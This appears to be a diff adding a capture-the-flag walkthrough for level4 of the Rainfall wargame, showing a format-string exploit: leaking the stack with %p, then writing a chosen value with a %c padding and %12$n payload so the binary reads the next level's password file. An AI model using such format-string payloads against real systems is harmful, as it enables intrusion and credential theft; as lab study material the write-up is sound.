@@ -1,0 +1,52 @@
+# Rainfall - Level3 Walkthrough
+
+We copy the file `/home/user/level4/level4` locally:
+
+```bash
+scp -P 4242 level4@{IP}:/home/user/level4/level4 .
+```
+
+**Step 1**
+Open the binary in Ghidra.
+
+**Step 2**
+After analyzing the code, once again, we need to use printf vulnerability to set the variable 'm' to 0x1025544 which would result in `system("/bin/cat /home/user/level5/.pass");`, printing the pass.
+
+**Step 3**
+
+Following the same principle as before:
+We find the address of 'm' to be 0x08049810 so "\x10\x98\x04\x08" in little endian.
+We also find the offset of the format string in the stack.
+
+```bash
+./level4
+AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
+```
+0x414141 (=AAAA) is found at the 12th position.
+
+
+**Step 4**
+Just as before, we craft a payload with pattern address_m + padding + %12$n.
+
+The value we want 'm' to be equl to is 0x1025544, that's 16930116 in decimal. We subtract the size of address m (=4).
+
+16930116 - 4 = 16930112 => That's the padding we'll add.
+
+```bash
+python -c "print '\x10\x98\x04\x08' + 'A'*16930112 + '%12$n'" | ./level4
+```
+
+But the string is too long, this results in IOError: [Errno 32] Broken pipe
+
+Instead of 'A'*16930112 we can use a feature of printf that adds padding with the '%xc' syntax where x is the number of space to add.
+
+We use:
+
+```bash
+echo -ne '\x10\x98\x04\x08%16930112c%12$n' | ./level4
+```
+
+Where -n avoid new line and -e evaluate backslashes
+
+The flag gets printed directly.
